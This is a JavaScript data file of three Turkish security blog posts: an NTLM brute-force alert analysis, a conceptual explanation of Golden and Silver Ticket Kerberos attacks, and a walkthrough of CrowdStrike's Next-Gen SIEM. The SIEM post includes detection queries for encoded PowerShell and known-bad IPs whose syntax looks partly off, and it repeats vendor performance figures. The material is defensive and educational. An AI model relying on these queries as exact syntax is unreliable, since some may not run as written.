  const posts = [
  {
    id: "alert-ntlm-bruteforce",
    title: "Alert Analizi #1 — İç Ağda NTLM Brute Force Tespiti",
    date: "14 Ekim 2026",
    excerpt: "Kurumsal ağda bir servis hesabından 58 saniye içinde 145 başarısız NTLM kimlik doğrulama denemesi. Cortex XDR alarmını nasıl analiz ettik, ne bulduk, ne öğrendik.",
    tags: ["Incident Response", "SOC Operations", "Active Directory"],
    severity: "high",
    body: `
    <img src="images/alert-ozet.svg" alt="Alert özeti diyagramı">

    <h2>Arka Plan</h2>
    <p>Bu yazı, staj sürecimde karşılaştığım ve analiz ettiğim gerçek bir Cortex XDR alert'ine dayanmaktadır. Şirket ve kullanıcı bilgileri anonimleştirilmiştir. Amacım hem kendi öğrenme sürecimi belgelemek hem de benzer bir alert'le karşılaşacak kişilere bir referans noktası sunmak.</p>

    <h2>Alert Özeti</h2>
    <p>Cortex XDR, iç ağda bir sunucu hesabından kaynaklanan yoğun NTLM kimlik doğrulama başarısızlıkları tespit etti. Alert detayları:</p>
    <ul>
      <li><strong>Kaynak hesap:</strong> Bir domain servis hesabı (domain\\servisHesabi)</li>
      <li><strong>Hedef:</strong> Dosya sunucusu (FILESERVER01)</li>
      <li><strong>Süre:</strong> 58 saniye</li>
      <li><strong>Deneme sayısı:</strong> 145 başarısız NTLM authentication</li>
      <li><strong>MITRE ATT&CK:</strong> TA0006 (Credential Access) / T1110 (Brute Force)</li>
    </ul>

    <h2>İlk Değerlendirme: Gerçek mi, False Positive mi?</h2>
    <p>İlk soru her zaman şu olmalı: <em>Bu bir saldırı mı, yoksa meşru bir uygulamanın yanlış davranışı mı?</em></p>
    <p>145 deneme / 58 saniye = saniyede yaklaşık 2.5 istek. Bu oran insan eliyle yapılabilecek bir şey değil, ama aynı zamanda özellikle agresif bir brute force aracının da altında kalıyor. Otomatik bir script veya yanlış yapılandırılmış bir servis olabilir.</p>
    <p>Kaynak hesabın bir <strong>servis hesabı</strong> olması dikkat çekici. Servis hesapları normalde belirli kaynaklarla konuşur ve başarısız auth denemeleri üretmez. Eğer gerçekten compromise edilmişse, saldırgan bu hesabı lateral movement için kullanıyor olabilir.</p>

    <h2>NTLM Neden Önemli?</h2>
    <p>NTLM (NT LAN Manager), Microsoft'un eski kimlik doğrulama protokolüdür. Kerberos'un aksine bir challenge-response mekanizması kullanır ve bu yapı onu birkaç saldırı vektörüne açık kılar:</p>
    <img src="images/ntlm-akis.svg" alt="NTLM challenge-response akışı">
    <ul>
      <li><strong>Pass-the-Hash:</strong> Parola yerine hash kullanılarak kimlik doğrulama yapılabilir</li>
      <li><strong>NTLM Relay:</strong> Authentication trafiği yakalanıp başka bir hedefe yönlendirilebilir</li>
      <li><strong>Brute Force:</strong> Hash değerleri offline kırılabilir veya online deneme yapılabilir</li>
    </ul>
    <p>Modern ortamlarda Kerberos tercih edilmeli ve NTLM devre dışı bırakılmalı veya kısıtlanmalıdır. Ama çoğu kurumsal ağda NTLM hâlâ aktif — çünkü eski sistemler, legacy uygulamalar veya yanlış yapılandırmalar buna ihtiyaç duyuyor.</p>

    <h2>Analiz Adımları</h2>
    <p>Alert'i aldıktan sonra izlediğim adımlar:</p>
    <img src="images/analiz-akisi.svg" alt="Analiz akışı">

    <h3>1. Zaman çizelgesini incele</h3>
    <p>145 deneme tam olarak hangi zaman aralığına sığıyor? Başlangıç ve bitiş saati önemli. Mesai saatleri dışında mı olmuş? Gece 3'te başlayan bir brute force ile sabah 9'da başlayan biri farklı risk profillerine sahip.</p>

    <h3>2. Kaynak hesabı sorgula</h3>
    <p>Hesap son ne zaman kullanılmış? Normal davranış profili nedir? Başka sistemlere de benzer denemeler yapmış mı? Active Directory logları ve SIEM'deki geçmiş eventlar burada kritik.</p>

    <h3>3. Hedef sistemi değerlendir</h3>
    <p>FILESERVER01, yüksek değerli bir hedef. Üzerinde ne tür veriler var? Başarılı bir kimlik doğrulama olmuş mu (sonrasında)? Eğer brute force başarılı olduysa ve ardından dosya erişimi varsa, bu artık Credential Access + Collection kombinasyonu demektir.</p>

    <h3>4. Ağ trafiğini kontrol et</h3>
    <p>Kaynak IP'den başka nereye trafik gidiyordu? Lateral movement'ın en belirgin işareti, bir makinenin normalde iletişim kurmadığı sistemlerle aniden konuşmaya başlamasıdır.</p>

    <h2>Behavioral Baseline: Normalin Dışına Çıkmak</h2>
    <p>Güvenlik analizinin temel sorusu şu: <em>Bu sistem normalde böyle mi davranır?</em></p>
    <p>Bir servis hesabı normalde önceden tanımlanmış kaynaklara, belirli portlara ve protokollere ihtiyaç duyar. Behavioral baseline olmadan bu soruyu cevaplayamazsınız. İyi bir SIEM kurulumunda her hesabın "normal" trafiği zaman içinde öğrenilir ve sapmalar otomatik olarak flaglenir.</p>
    <p>Bu case'de servis hesabının FILESERVER01'e NTLM ile bağlanması alışılmadık bir durumdu — normalde bu hesap farklı bir protokol ve farklı bir hedef kullanıyordu. Bu sapma alert'i tetikledi.</p>

    <h2>Çıkarımlar</h2>
    <p>Bu alert'in analizi birkaç önemli dersi beraberinde getirdi:</p>
    <ul>
      <li>Servis hesapları düzenli olarak denetlenmeli, minimum yetki prensibiyle çalışmalı</li>
      <li>NTLM kullanımı ortamda loglanmalı ve anormallikler için alarm kurulmalı</li>
      <li>Lateral movement tespiti için hem kaynak hem hedef tarafında log korelasyonu şart</li>
      <li>False positive ile gerçek tehdit arasındaki fark çoğu zaman context'te gizli: hesabın geçmiş davranışı, hedef sistemin değeri, olay zamanlaması</li>
    </ul>
    <p class="closing">Her alert bir hikaye anlatır.<br><span>Analistin görevi, o hikayenin ne anlama geldiğini çözmektir.</span></p>
  `
  },
   {
  id: "golden-ticket-silver-ticket",
  title: "Golden Ticket ve Silver Ticket — Kerberos'e Yapılan Saldırılar",
  date: "05 Ağustos 2026",
  excerpt: "Active Directory ortamlarında karşılaşılan en tehlikeli ve en kalıcı saldırı tekniklerinden ikisi golden ticket ve silver ticket saldırılarıdır. Kerberos'un güven mekanizmasını hedef alan bu saldırıların ne olduğunu, neden birbirinden farklı olduğunu ve neden klasik önlemlerin işe yaramadığını anlattım.",
  tags: ["Active Directory", "Kerberos", "Red Team"],
  severity: "critical",
  body: `
    <img src="images/AD.png" alt="CS Diagramı" style="width:100%; background:#000000; padding:24px; border-radius:12px; margin:0 0 20px; display:block;">
    <h2>1. Giriş</h2>
    <p>Active Directory ortamlarında karşılaşılan en tehlikeli ve en kalıcı saldırı tekniklerinden ikisi golden ticket ve silver ticket saldırılarıdır. Bu yazıda önce çok kısaca Active Directory'nin ne olduğuna, sonra normal Kerberos akışına bakacağız, ardından bu iki saldırının tam olarak neyi hedeflediğini ve neden bu kadar tehlikeli olduğunu ele alacağız.</p>

    <h2>Active Directory Nedir, Ne Değildir?</h2>
    <p>Active Directory (AD), Microsoft'un geliştirdiği ve bir şirket ağındaki kullanıcıları, bilgisayarları, sunucuları ve bunların yetkilerini merkezi olarak yöneten bir dizin servisidir.</p>
    <pre><code>Active Directory
   |
   |---- Kullanıcılar (johnsmith, admin, ...)
   |---- Bilgisayarlar (PC'ler, sunucular)
   |---- Gruplar (Domain Admins, IT, Muhasebe, ...)
   |---- Politikalar (GPO — kimin neye erişebileceği)</code></pre>
    <p>Kısaca: bir şirkette 500 çalışan varsa, her birinin kendi bilgisayarına ayrı ayrı kullanıcı açmak yerine, herkes tek bir merkezi sistemde tanımlanır. Kullanıcı hangi bilgisayarda oturum açarsa açsın aynı kullanıcı adı ve şifre ile giriş yapar, yetkileri merkezi olarak belirlenir.</p>
    <p><strong>Ne değildir:</strong> Active Directory tek başına bir güvenlik duvarı ya da antivirüs değildir — bir kimlik ve yetki yönetim sistemidir. Kim kimdir, kim neye erişebilir sorularının cevabını tutar. Bu yazının konusu olan golden/silver ticket saldırıları da tam olarak bu kimlik doğrulama mekanizmasını — Kerberos'u — hedef alır. AD'nin güvenlik duvarını değil, "sen kimsin" diye soran ve cevaplayan çekirdek sistemini.</p>
    <p>Domain'deki bu kimlik doğrulama işini yürüten protokol Kerberos'tur. Şimdi ona bakalım.</p>

    <h2>Önce Normal Kerberos Akışını Hatırlayalım</h2>
    <p>Normalde süreç iki aşamadan oluşur. Önce TGT alınır, sonra bu TGT kullanılarak servis ticket (TGS) alınır.</p>
    <pre><code>1. Aşama — TGT almak:

Kullanıcı
   | kullanıcı adı + şifre
   v
Domain Controller (KDC)
   | TGT verir
   v
krbtgt/LAB.LOCAL</code></pre>
    <pre><code>2. Aşama — Servis ticket almak:

Kullanıcı (TGT ile)
   |
   v
KDC
   | Servis Ticket (TGS) verir
   v
SMB / LDAP / HTTP / MSSQL</code></pre>
    <p>Bu iki aşamayı ayırt etmek çok önemli — çünkü golden ticket ve silver ticket, tam olarak bu iki farklı aşamayı hedefler.</p>

    <h2>Golden Ticket Nedir?</h2>
    <p>Golden Ticket, TGT seviyesini hedefleyen bir tekniktir. Normalde TGT'yi kim oluşturur?</p>
    <pre><code>Domain Controller
        |
     KRBTGT hesabı
        |
       TGT</code></pre>
    <p>KRBTGT, Kerberos'un ana güven noktasıdır. Bunu şöyle düşün: bir ülkeye giriş için önce pasaport alıyorsun. TGT, o pasaporttur. Golden Ticket mantığında hedef şudur:</p>
    <p><em>"Bu pasaport basma yetkisini ele geçirirsem, istediğim kimlikle geçerli görünen bir pasaport oluşturabilirim."</em></p>
    <p>Bir saldırgan bu seviyede kontrol elde ederse, Administrator gibi, Domain Admin gibi, farklı kullanıcılar gibi görünen kimlik doğrulamalar oluşturabilir. Çünkü sorun artık tek bir servis değil, domain kimlik doğrulama zincirinin kendisidir. Pasaport basma yetkisini ele geçiren biri, artık hangi ülkeye hangi kimlikle gireceğini kendisi seçer — sınır kapısındaki hiçbir görevli bunu sorgulamaz, çünkü pasaport tamamen gerçek görünmektedir.</p>

    <h2>Silver Ticket Nedir?</h2>
    <p>Silver Ticket daha alt seviyededir. Burada hedef TGT değil, TGS yani belirli bir servise ait ticket'tır.</p>
    <pre><code>Client
   |
   v
SMB / MSSQL / HTTP / LDAP
(tek bir servis)</code></pre>
    <p>Bunu şöyle düşün:</p>
    <p><strong>Golden Ticket:</strong> "Ben ülkenin pasaport basma sistemini kontrol ediyorum."</p>
    <p><strong>Silver Ticket:</strong> "Ben sadece belirli bir binaya giriş kartı oluşturuyorum."</p>
    <p>Saldırgan artık ülkenin tamamına giriş yetkisine sahip değil — sadece tek bir binanın güvenlik sistemini kendi başına taklit edebiliyor. Bunun için o binanın servis hesabının hash'ini ele geçirmiş olması yeterli; KDC'ye hiç ihtiyacı yok.</p>

    <h2>İki Saldırı Neden Farklı Seviyelerde?</h2>
    <p>Aradaki fark, hangi hash'in ele geçirildiğiyle doğrudan ilgili:</p>
    <pre><code>KRBTGT hash ele geçirilirse
        |
        v
   Golden Ticket
   (tüm domain, TGT seviyesi)

Servis hesabı hash'i ele geçirilirse
        |
        v
   Silver Ticket
   (tek servis, TGS seviyesi)</code></pre>
    <p>Golden ticket'ta saldırgan KDC'nin kendisini taklit edebiliyor — çünkü elindeki hash, KDC'nin TGT üretirken kullandığı hash ile aynıdır. Silver ticket'ta ise saldırgan yalnızca hedef servisi taklit edebiliyor; KDC'ye hiç uğramadan, doğrudan o servisin kabul edeceği bir bilet üretiyor.</p>
    <p>Bu da silver ticket'ı tespit açısından daha sinsi kılan şeydir: KDC hiç devreye girmediği için, domain controller üzerindeki Kerberos loglarında bu işlemin izi neredeyse hiç görünmez.</p>

    <h2>Karşılaştırma</h2>
    <table style="width:100%; border-collapse:collapse; margin:20px 0;">
      <thead>
        <tr style="background:#1a1a2e; color:#00ff9d;">
          <th style="padding:10px; border:1px solid #333; text-align:left;">Özellik</th>
          <th style="padding:10px; border:1px solid #333; text-align:left;">Golden Ticket</th>
          <th style="padding:10px; border:1px solid #333; text-align:left;">Silver Ticket</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td style="padding:10px; border:1px solid #333;">Hash</td>
          <td style="padding:10px; border:1px solid #333;">krbtgt</td>
          <td style="padding:10px; border:1px solid #333;">Servis hesabı</td>
        </tr>
        <tr style="background:#111;">
          <td style="padding:10px; border:1px solid #333;">Bilet</td>
          <td style="padding:10px; border:1px solid #333;">TGT</td>
          <td style="padding:10px; border:1px solid #333;">TGS</td>
        </tr>
        <tr>
          <td style="padding:10px; border:1px solid #333;">KDC etkileşimi</td>
          <td style="padding:10px; border:1px solid #333;">Yok</td>
          <td style="padding:10px; border:1px solid #333;">Yok</td>
        </tr>
        <tr style="background:#111;">
          <td style="padding:10px; border:1px solid #333;">Kapsam</td>
          <td style="padding:10px; border:1px solid #333;">Tüm domain</td>
          <td style="padding:10px; border:1px solid #333;">Tek servis</td>
        </tr>
        <tr>
          <td style="padding:10px; border:1px solid #333;">Tespit</td>
          <td style="padding:10px; border:1px solid #333;">Nispeten kolay</td>
          <td style="padding:10px; border:1px solid #333;">Çok zor</td>
        </tr>
      </tbody>
    </table>

    <h2>Neden Bu Kadar Önemli?</h2>
    <p>Her iki saldırı da klasik "şifre çalma" mantığından farklı çalışır — burada çalınan şey bir kullanıcı şifresi değil, sistemin kendisinin güvendiği bir kriptografik anahtardır. Bu da klasik önlemleri anlamsız kılar. Kullanıcıya şifre değiştirtmek, hesabı kilitlemek işe yaramaz — çünkü saldırgan tek bir kullanıcının değil, sistemin güven mekanizmasının kendisinin bir kopyasına sahiptir.</p>
    <p>Bu yüzden savunma tarafında odak noktası da farklıdır:</p>
    <ul>
      <li><strong>Hash'in ele geçirilmesini zorlaştırmak:</strong> krbtgt ve servis hesaplarına erişimi kısıtlamak, AES şifreleme zorunluluğu</li>
      <li><strong>Ele geçirilse bile etkisini kısa sürede sıfırlamak:</strong> krbtgt'nin düzenli rotasyonu, gMSA gibi otomatik rotasyonlu servis hesapları</li>
      <li><strong>Görünürlük sağlamak:</strong> Kerberos audit policy'leri, Event ID 4768 / 4769 / 4672 loglaması</li>
    </ul>
    <p>Göremediğini durduramayacağın için görünürlük burada kritik. Silver ticket özellikle KDC'ye hiç uğramadığı için standart Kerberos loglarında iz bırakmaz — bu yüzden servis seviyesinde izleme ayrıca yapılandırılmalıdır.</p>
  `
},
    {
  id: "crowdstrike-next-gen-siem",
  title: "CrowdStrike Falcon Next-Gen SIEM — Modül Yapısı ve Kullanımı",
  date: "22 Temmuz 2026",
  excerpt: "Geleneksel SIEM'ler log toplar, indeksler ve arama yapar. Ama modern saldırılar bu döngünün çok ötesine geçti. Bu yazıda CrowdStrike Falcon Next-Gen SIEM'in ana bölümlerini, her menünün ne işe yaradığını ve SOC perspektifinden nasıl kullanıldığını anlatıyorum.",
  tags: ["SIEM", "CrowdStrike", "Blue Team"],
  severity: "info",
  body: `
    <img src="images/csn.jpg" alt="CS Diagramı" style="width:100%; background:#ffffff; padding:24px; border-radius:12px; margin:0 0 20px; display:block;">
    <h2>1. Giriş</h2>
    <p>Geleneksel SIEM'ler log toplar, indeksler ve arama yapar. Ama modern saldırılar bu döngünün çok ötesine geçti. Bir saldırgan ağa girdikten sonra saatler değil dakikalar içinde yanal hareket yapabiliyor, kimlik bilgilerini ele geçirebiliyor, veri sızdırabiliyor. Geleneksel SIEM bu hıza yetişemiyor.</p>
    <p>CrowdStrike Falcon Next-Gen SIEM, bu boşluğu kapatmak için tasarlanmış. Bu yazıda platformun ana bölümlerini, her menünün ne işe yaradığını ve SOC perspektifinden nasıl kullanıldığını anlatacağım.</p>

    <h2>Next-Gen SIEM Nedir?</h2>
    <p>CrowdStrike Falcon Next-Gen SIEM, EDR, kimlik koruması, tehdit istihbaratı ve log yönetimini tek bir platformda birleştiren yapay zeka destekli güvenlik operasyon platformudur.</p>
    <p>Geleneksel SIEM'den farkını şöyle özetleyebilirim: Geleneksel SIEM index bazlı çalışır — bu yavaşlık ve yüksek depolama maliyeti demektir. Next-Gen SIEM ise index-free mimarisiyle petabyte ölçeğinde veriye 150x daha hızlı erişim sağlıyor. Veri kaynağı açısından geleneksel SIEM sadece log dosyalarına bakarken, Next-Gen SIEM native CrowdStrike verisi, üçüncü taraf entegrasyonlar ve bulut verisini aynı anda işleyebiliyor. Tespit tarafında statik korelasyon kuralları yerine AI destekli davranış analizi ve UEBA devrede. Maliyet açısından ise depolama maliyeti %80'e kadar düşüyor.</p>
    <p>Temel özellikleri:</p>
    <ul>
      <li>Index-free mimari: Petabyte ölçeğinde veriye 150x daha hızlı erişim</li>
      <li>AI destekli tespit: Native ve üçüncü taraf veriler üzerinde birleşik detection</li>
      <li>Entegre Case Management: Soruşturma ve yanıt için tek merkezi nokta</li>
      <li>CrowdStrike Query Language (CQL): Güçlü ve esnek sorgu dili</li>
      <li>Falcon Onum: AI destekli data pipeline — 5x daha hızlı streaming, %50 daha düşük depolama maliyeti</li>
      <li>Üçüncü taraf veri entegrasyonu: Falcon Insight müşterilerine günlük 10 GB ücretsiz ingestion</li>
    </ul>

    <h2>Bölüm 1: Monitor and Investigate</h2>
    <p>Monitor and Investigate, Next-Gen SIEM'in ana izleme ve soruşturma merkezidir. Güvenlik olaylarının gerçek zamanlı takip edildiği, tehditlerin derinlemesine incelendiği ve soruşturma süreçlerinin yönetildiği bölümdür.</p>

    <h3>Event Search</h3>
    <p>Event Search, tüm log kaynaklarındaki olayları hızlıca aramak ve filtrelemek için kullanılan temel sorgu arayüzüdür. Günlük SOC operasyonları için tasarlanmıştır. CQL ile sorgular yazılır, zaman bazlı filtreleme, alan bazlı filtreleme, free-text arama ve regex desteği mevcuttur.</p>
    <p>Örnek bir CQL sorgusu:</p>
    <pre><code>event_simpleName=ProcessRollup2 | FileName=/.*powershell.*/i | CommandLine=/*-enc*/</code></pre>
    <p>Bu sorgu, sistem genelinde encoded komutla çalıştırılan tüm PowerShell process'lerini listeler.</p>

    <h3>Advanced Event Search</h3>
    <p>Advanced Event Search, Event Search'ün daha güçlü versiyonudur. Karmaşık soruşturmalar, korelasyon aramaları ve threat hunting için kullanılır. Event Search hızlı günlük operasyonlar için idealken, Advanced Event Search derin analizler için kullanılır. Aggregation, istatistik ve multi-source sorgu gibi gelişmiş özellikler sadece burada mevcut.</p>
    <p>Öne çıkan özellikler:</p>
    <ul>
      <li>Çoklu veri kaynağı sorgulama: Falcon EDR, IDP, ağ logları ve üçüncü taraf kaynaklar aynı sorguda</li>
      <li>Aggregation ve istatistik: Olayları gruplama, sayma, ortalama alma</li>
      <li>Live streaming search: Gerçek zamanlı olarak gelen olayları canlı izleme</li>
      <li>Saved searches: Sık kullanılan sorguları kaydetme ve tekrar kullanma</li>
      <li>Falcon Query Translation Agent: Eski SIEM sorgularını — Splunk dahil — otomatik olarak CQL'e çevirir</li>
    </ul>

    <h3>Dashboards</h3>
    <p>Dashboards, güvenlik olaylarını gerçek zamanlı görselleştiren özelleştirilebilir izleme panolarıdır. Widget bazlı yapısıyla grafik, tablo, sayaç ve harita gibi farklı görselleştirme türlerini destekler. Her analist kendi iş akışına göre dashboard oluşturabilir, ekip içinde paylaşabilir.</p>
    <p>Tipik bir SOC dashboard'unda şunlar yer alır: Son 24 saatteki detection sayısı ve severity dağılımı, en çok alarm üreten kullanıcılar ve sistemler, şüpheli bağlantıların kaynak ülkelerini gösteren coğrafi harita, failed login denemeleri ve C2 iletişim girişimleri.</p>

    <h3>Scheduled Dashboard Reports</h3>
    <p>Scheduled Dashboard Reports, belirli aralıklarla otomatik rapor üreten ve ilgili kişilere ileten sistemdir. Haftalık/aylık güvenlik özeti raporları otomatik oluşturulur. CISO veya yönetime düzenli raporlama, KVKK ve ISO 27001 gibi uyumluluk gereksinimleri için denetim raporları bu bölümden yönetilir.</p>

    <h2>Bölüm 2: Case Management</h2>
    <p>Case Management, birden fazla alarmı ve olayı tek bir vaka çatısı altında toplayarak soruşturma ve yanıt süreçlerini koordine eden merkezi yönetim sistemidir. <strong>Bir saldırı genellikle tek bir alarmdan oluşmaz — phishing e-postası, ardından şüpheli giriş, ardından lateral movement, ardından ransomware. Bunların hepsi ayrı alarmlardır.</strong> Case Management bu alarmları tek bir saldırı hikayesi olarak birleştirir.</p>

    <h3>Case Templates</h3>
    <p>Case Templates, belirli olay türleri için önceden tanımlanmış yapılandırılmış vaka şablonlarıdır. Her olay türü için sıfırdan başlamak yerine ilgili şablon açılır ve doldurulur. Şablonlar aynı zamanda Playbook işlevi görür — olay anında "ne yapacağız?" yerine şablonu takip edersiniz. Müdahale süresi kısalır, adım atlanma riski azalır.</p>
    <p>Örnek şablonlar:</p>
    <ul>
      <li>Ransomware vakası: Containment adımları, iletişim listesi, forensic checklist</li>
      <li>Phishing vakası: Etkilenen kullanıcılar, kötü amaçlı URL/ek analizi, kimlik bilgisi sıfırlama</li>
      <li>Insider threat: Kullanıcı aktivite analizi, HR bildirimi, yasal süreç adımları</li>
      <li>BEC (Business Email Compromise): Mail akış analizi, finansal işlem durdurma</li>
    </ul>

    <h3>SLAs</h3>
    <p>SLA (Service Level Agreement), bir vakanın ne kadar sürede yanıt alması ve çözüme kavuşturulması gerektiğini tanımlayan kurallardır. Ekibin performans standartlarını belirler. SLA ihlali durumunda otomatik eskalasyon tetiklenir — belirlenen kişilere bildirim gönderilir ve vakanın önceliği artırılır. Bu sayede kritik olaylar göz ardı edilmez.</p>

    <h3>Notification Groups</h3>
    <p>Notification Groups, hangi olayda kimin bilgilendirileceğini tanımlayan gruplandırma sistemidir. Doğru kişinin doğru zamanda bilgilendirilmesini sağlar.</p>
    <ul>
      <li>SOC Tier 1: Tüm alarmlardan haberdar edilir</li>
      <li>SOC Tier 2: Sadece High ve Critical alarmlardan</li>
      <li>CISO grubu: Critical olaylar ve SLA ihlallerinden</li>
      <li>Legal grubu: Veri ihlali şüphesi durumunda devreye girer</li>
    </ul>

    <h3>Case Dashboard</h3>
    <p>Case Dashboard, tüm açık vakaların durumunu, önceliklerini, atanmış analistleri ve SLA sağlık durumunu gösteren merkezi panodur. Açık/Kapalı/Bekleyen vaka sayıları, SLA uyum oranı, analist iş yükü dağılımı ve trend analizi burada görülür.</p>

    <h3>Mirror Configuration</h3>
    <p>Mirror Configuration, CrowdStrike vakalarını harici ticketing ve ITSM sistemleriyle iki yönlü senkronize eden entegrasyon aracıdır. Jira ve ServiceNow başlıca entegrasyon hedefleridir. Güvenlik ekibi CrowdStrike'ta çalışırken IT operasyon ekibi kendi araçlarında çalışmaya devam edebilir — veriler otomatik senkronize olur.</p>

    <h2>Bölüm 3: Log Management</h2>
    <p>Log Management, farklı kaynaklardan gelen logların toplanması, normalize edilmesi, depolanması ve aranması için kullanılan kapsamlı veri yönetim altyapısıdır. Next-Gen SIEM'in "beyni" bu bölümdür.</p>

    <h3>Data Onboarding</h3>
    <p>Data Onboarding, farklı sistemlerin loglarını CrowdStrike Next-Gen SIEM'e bağlamak için kullanılan entegrasyon merkezidir. Desteklenen veri kaynağı türleri:</p>
    <ul>
      <li>Native CrowdStrike verisi: EDR, IDP, Cloud Security — otomatik entegre, ek yapılandırma gerekmez</li>
      <li>Üçüncü taraf güvenlik araçları: Palo Alto, Fortinet, Cisco, Check Point gibi firewall'lar</li>
      <li>Kimlik sağlayıcıları: Azure AD, Okta, LDAP</li>
      <li>Bulut platformları: AWS (GuardDuty, CloudTrail, S3), Azure (Sentinel, Defender), GCP</li>
      <li>On-premises sistemler: Windows Event Log, Linux syslog, network cihazları</li>
    </ul>
    <p>Falcon Sensor-Based Log Collection, zaten ortamda kurulu olan Falcon sensor'ünü ayrı bir log collector kurmadan üçüncü taraf log kaynaklarını toplayabilecek şekilde genişletiyor. Otomatik veri normalizasyonu da kritik bir özellik: Her sistemin logu farklı formatta gelir. Data Onboarding, bunları CrowdStrike Parsing Standard (CPS) formatına otomatik normalize eder — böylece tüm kaynaklar tek sorguda aranabilir hale gelir.</p>
    <p>Falcon Insight (EDR) müşterilerine günlük 10 GB üçüncü taraf veri ingestion ücretsiz sunulmaktadır.</p>

    <h3>Lookup Files</h3>
    <p>Lookup Files, sorguları zenginleştirmek için kullanılan referans tablolardır. CSV formatında yüklenen bu dosyalar, log verilerini ek bağlamla ilişkilendirmeyi sağlar.</p>
    <ul>
      <li>Şirket IP listesi: "Bu IP iç ağ mı dış mı?" sorusunu otomatik yanıtlar</li>
      <li>VIP kullanıcı listesi: CEO, CFO gibi kritik kullanıcıların aktiviteleri daha yüksek öncelikle izlenir</li>
      <li>Bilinen kötü IP'ler: Threat intelligence feed'inden gelen IOC listesi — bağlantılar anında eşleştirilir</li>
      <li>Asset envanter: Kritik sunucuların listesi — bu sistemlere yapılan aktiviteler öncelikli alarm üretir</li>
    </ul>
    <p>Örnek CQL sorgusu:</p>
    <pre><code>event_simpleName=UserLogon | lookup src_ip in known_bad_ips.csv | where match=true</code></pre>
    <p>Bu sorgu, bilinen kötü IP'lerden gelen tüm başarılı girişleri tespit eder.</p>

    <h3>Data Settings</h3>
    <p>Data Settings, log verilerinin yaşam döngüsünü ve yönetim politikalarını yapılandırdığınız bölümdür.</p>
    <ul>
      <li>Retention politikaları: Hangi log türü ne kadar süre saklanacak — kritik güvenlik logları için 1-2 yıl, rutin aktivite logları için 90 gün gibi</li>
      <li>Depolama optimizasyonu: Falcon Onum ile sık erişilen veriler hızlı depolamada, eski veriler maliyet etkin uzun vadeli depolamada tutulur</li>
      <li>Parser yönetimi: Gelen log formatlarını parse eden kuralların durumu ve güncelleme takibi</li>
      <li>Amazon S3 arşivleme: Falcon Data Replicator (FDR) ile üçüncü taraf SIEM verisi otomatik S3'e arşivlenebilir</li>
    </ul>
    <p>KVKK ve ISO 27001 log saklama gereksinimleri için retention politikaları kritiktir. "Kim ne zaman neye erişti?" sorusunu 2 yıl öncesi için de yanıtlayabilmek bu ayarlarla mümkün olur.</p>

    <h2>Bölüm 4: Entity Management</h2>
    <p>Entity Management, ortamdaki tüm dijital varlıkların — cihazlar ve kullanıcılar — SIEM perspektifinden merkezi görünürlüğünü sağlayan bölümdür. <strong>Bir güvenlik olayını analiz ederken "bu cihaz nedir, bu kullanıcı kim" sorularına hızlıca cevap verir.</strong></p>

    <h3>Hosts</h3>
    <p>Hosts bölümü, Falcon sensörü kurulu tüm endpoint cihazlarının SIEM bağlamındaki görünümüdür. Her cihaz için hostname, IP, OS, sensor versiyonu, risk skoru, detection geçmişi, ağ bağlantıları ve process ağacı görüntülenebilir. <strong>Bir ransomware alarmı geldiğinde önce Hosts'tan etkilenen cihazın risk geçmişine bakılır — "Bu cihazda daha önce şüpheli aktivite var mıydı? Hangi kullanıcı logon olmuş? Kritik bir sunucu mu?" gibi sorular burada yanıtlanır.</strong></p>

    <h3>Users</h3>
    <p>Users bölümü, ortamdaki tüm kullanıcı hesaplarının SIEM log perspektifinden görünümüdür. IDP modülündeki All Users'dan farklı olarak burada log aktiviteleri ve detection geçmişi ön plandadır. Her kullanıcı için aktivite özeti, risk skoru, detection geçmişi ve şüpheli aktivite işaretleri görüntülenir.</p>
    <p>UEBA bağlantısı burada kritik. Next-Gen SIEM her kullanıcı için normal davranış baseline'ı oluşturur. "Bu kullanıcı normalde sabah 9'da Türkiye'den giriş yapar, sadece muhasebe sistemlerine erişir." Bunun dışına çıkan her aktivite anomali olarak işaretlenir ve Users bölümünde görülür.</p>

    <h2>Bölüm 5: Unified Content Library</h2>
    <p>Unified Content Library, Next-Gen SIEM'deki tüm detection içeriklerini — kurallar, dashboard şablonları, sorgu paketleri — merkezi olarak yöneten ve MITRE ATT&CK ile eşleştiren kütüphanedir.</p>
    <ul>
      <li>Out-of-the-box detection kuralları: CrowdStrike'ın hazır olarak sunduğu yüzlerce detection kuralı</li>
      <li>Dashboard şablonları: Ransomware, insider threat, cloud güvenliği gibi konularda hazır SOC dashboard'ları</li>
      <li>Query paketleri: Belirli tehdit senaryoları için hazır CQL sorgu koleksiyonları</li>
      <li>Playbook şablonları: Olay türlerine göre hazır müdahale adımları</li>
      <li>Custom içerik: Kendi yazdığınız kurallar ve sorgular da buraya eklenir</li>
    </ul>
    <p>En güçlü özelliği MITRE ATT&amp;CK coverage görünümü. Coverage haritası, hangi teknikler için detection var hangisi eksik olduğunu MITRE ATT&amp;CK matrix üzerinde gösteriyor. Gap analizi sayesinde "<strong>T1059.001 PowerShell için kuralım var mı?</strong>" sorusu saniyeler içinde yanıtlanıyor. Öneri sistemi eksik coverage için uygulanabilir detection içeriği öneriyor.</p>
    <p>"<strong>APT29 gibi bir tehdit aktörü bize saldırsa, hangi tekniklerini yakalayabiliriz?</strong>" sorusunu Unified Content Library ile yanıtlayabilirsiniz. Bu bölüm savunmanızın haritasıdır.</p>
    <p>CrowdStrike yeni tehdit aktörleri ve saldırı teknikleri keşfedildikçe bu kütüphaneyi günceller. Güncellemeler otomatik uygulanır, özelleştirilmiş içerikler etkilenmez.</p>

    <h2>Genel Değerlendirme</h2>
    <p><strong>Next-Gen SIEM'i tek cümlede özetlemek gerekirse: alertten soruşturmaya, soruşturmadan yanıta kadar tüm süreç tek bir konsolda tamamlanıyor.</strong></p>
    <p>Event Search ve Advanced Event Search ile log verisi sorgulanır. Dashboard'larla görünürlük sağlanır. Case Management ile soruşturma koordine edilir. Entity Management ile host ve kullanıcı bağlamı anlaşılır. Unified Content Library ile MITRE ATT&amp;CK coverage'ı izlenir.</p>
    <p>Geleneksel SIEM'lerde bu adımların her biri farklı araçlarda yapılırdı. Platform geçişleri zaman kaybettirir, bağlam kopar, kritik detaylar gözden kaçar. Next-Gen SIEM bu parçalanmışlığı ortadan kaldırıyor.</p>
